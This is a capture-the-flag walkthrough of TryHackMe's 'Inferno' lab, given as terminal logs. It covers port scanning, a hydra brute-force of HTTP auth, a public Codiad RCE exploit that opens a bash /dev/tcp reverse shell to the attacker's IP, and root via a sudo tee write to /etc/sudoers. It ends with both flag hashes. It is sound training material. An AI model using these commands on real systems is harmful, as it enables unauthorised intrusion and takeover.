----
eal Life machine + CTF. The machine is designed to be real-life (maybe not?) and is perfect for newbies starting out in penetration testing
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/04838068cabd2452b322e06418cce864.png)

### Task 1  Inferno

 Start Machine

﻿"Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."

  

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt), can you find them and become root?

  

**Remember: in the nine circles of Hell you will find some demons that will try to prevent your access, ignore them and move on. (****if you can****)**

Answer the questions below

```
──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.162.52 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.162.52:21
Open 10.10.162.52:22
Open 10.10.162.52:23
Open 10.10.162.52:25
Open 10.10.162.52:80
Open 10.10.162.52:88
Open 10.10.162.52:106
Open 10.10.162.52:110
Open 10.10.162.52:194
Open 10.10.162.52:389
Open 10.10.162.52:443
Open 10.10.162.52:464
Open 10.10.162.52:636
Open 10.10.162.52:750
Open 10.10.162.52:775
Open 10.10.162.52:777
Open 10.10.162.52:779
Open 10.10.162.52:783
Open 10.10.162.52:808
Open 10.10.162.52:873
Open 10.10.162.52:1178

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.162.52
Connected to 10.10.162.52.
^C
421 Service not available, user interrupt. Connection closed.
ftp> exit

Oh quanto parve a me gran maraviglia
quand'io vidi tre facce a la sua testa!
L'una dinanzi, e quella era vermiglia;

l'altr'eran due, che s'aggiugnieno a questa
sovresso 'l mezzo di ciascuna spalla,
e se' giugnieno al loco de la cresta 

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.162.52/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.52/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/15 23:13:31 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.162.52/inferno              (Status: 401) [Size: 459]

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.162.52 http-get /inferno -t 64 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-15 23:19:29
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.162.52:80/inferno
[STATUS] 6400.00 tries/min, 6400 tries in 00:01h, 14337999 to do in 37:21h, 64 active
[80][http-get] host: 10.10.162.52   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-15 23:21:32

login 2 times (codiad)

https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
Cloning into 'Codiad-Remote-Code-Execute-Exploit'...
remote: Enumerating objects: 133, done.
remote: Total 133 (delta 0), reused 0 (delta 0), pack-reused 133
Receiving objects: 100% (133/133), 2.15 MiB | 1.52 MiB/s, done.
Resolving deltas: 100% (56/56), done.
                                                                                                           
┌──(witty㉿kali)-[~/Downloads]
└─$ cd Codiad-Remote-Code-Execute-Exploit 
                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ ls
exploit.py  img  README.md
                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ python exploit.py          
  File "/home/witty/Downloads/Codiad-Remote-Code-Execute-Exploit/exploit.py", line 22
    print "[+] Login Content : %s" % (content)
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ python2 exploit.py
Usage : 
        python exploit.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python exploit.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example : 
        python exploit.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python exploit.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author : 
        WangYihang <wangyihanger@gmail.com>

┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ python2 exploit.py http://admin:dante1@10.10.162.52/inferno/ 'admin' 'dante1' 10.8.19.103 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.8.19.103/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...

┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ echo 'bash -c "bash -i >/dev/tcp/10.8.19.103/4445 0>&1 2>&1"' | nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.162.52] 55344

┌──(witty㉿kali)-[~/Downloads]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.162.52] 44112
bash: cannot set terminal process group (955): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null           
www-data@Inferno:/var/www/html/inferno/components/filemanager$ cd /home
cd /home
www-data@Inferno:/home$ ls
ls
dante
www-data@Inferno:/home$ cd dante
cd dante
www-data@Inferno:/home/dante$ ls
ls
Desktop    Downloads  Pictures	Templates  local.txt
Documents  Music      Public	Videos
www-data@Inferno:/home/dante$ cat local.txt
cat local.txt
cat: local.txt: Permission denied

www-data@Inferno:/home/dante/Downloads$ ls -lah
ls -lah
total 4.4M
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 .
drwxr-xr-x 13 dante dante 4.0K Jan 11  2021 ..
-rw-r--r--  1 root  root  1.5K Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root  135K Jan 11  2021 CantoI.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoII.docx
-rwxr-xr-x  1 root  root   87K Jan 11  2021 CantoIII.docx
-rwxr-xr-x  1 root  root   63K Jan 11  2021 CantoIV.docx
-rwxr-xr-x  1 root  root  131K Jan 11  2021 CantoIX.docx
-rwxr-xr-x  1 root  root   43K Jan 11  2021 CantoV.docx
-rwxr-xr-x  1 root  root  131K Jan 11  2021 CantoVI.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoVII.docx
-rwxr-xr-x  1 root  root   63K Jan 11  2021 CantoX.docx
-rwxr-xr-x  1 root  root  119K Jan 11  2021 CantoXI.docx
-rwxr-xr-x  1 root  root  146K Jan 11  2021 CantoXII.docx
-rwxr-xr-x  1 root  root  212K Jan 11  2021 CantoXIII.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoXIV.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoXIX.docx
-rwxr-xr-x  1 root  root   87K Jan 11  2021 CantoXV.docx
-rwxr-xr-x  1 root  root  135K Jan 11  2021 CantoXVI.docx
-rwxr-xr-x  1 root  root  119K Jan 11  2021 CantoXVII.docx
-rwxr-xr-x  1 root  root  2.3M Jan 11  2021 CantoXVIII.docx
-rwxr-xr-x  1 root  root   63K Jan 11  2021 CantoXX.docx

www-data@Inferno:/home/dante/Downloads$ cat .download.dat
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a

from hex

«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh dante@10.10.162.52                   
The authenticity of host '10.10.162.52 (10.10.162.52)' can't be established.
ED25519 key fingerprint is SHA256:YUnYuJpwLi/VNgOqUh7eCD9Pcw8Lxz/RYQv3sUWPu8E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.162.52' (ED25519) to the list of known hosts.
dante@10.10.162.52's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 16 03:38:41 UTC 2023

  System load:  0.0               Processes:           593
  Usage of /:   41.9% of 8.79GB   Users logged in:     0
  Memory usage: 65%               IP address for eth0: 10.10.162.52
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@Inferno:~$ id
uid=1000(dante) gid=1000(dante) groups=1000(dante),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
dante@Inferno:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
dante@Inferno:~$ cat local.txt
77f6f3c544ec0811e2d1243e2e0d1835

dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee

dante@Inferno:~$ sudo /usr/bin/tee -a "/etc/shadow"
^C
dante@Inferno:~$ echo "dante    ALL=(ALL:ALL) ALL" | sudo tee -a "/etc/sudoers"
dante    ALL=(ALL:ALL) ALL
dante@Inferno:~$ sudo -s
[sudo] password for dante: 
root@Inferno:~# cd /root
root@Inferno:/root# ls
proof.txt
root@Inferno:/root# cat proof.txt 
Congrats!

You've rooted Inferno!

f332678ed0d0767d7434b8516a7c6144

mindsflee
DATA

```

Locate and find local.txt

*77f6f3c544ec0811e2d1243e2e0d1835*

Locate and find proof.txt

*f332678ed0d0767d7434b8516a7c6144*

[[The Impossible Challenge]]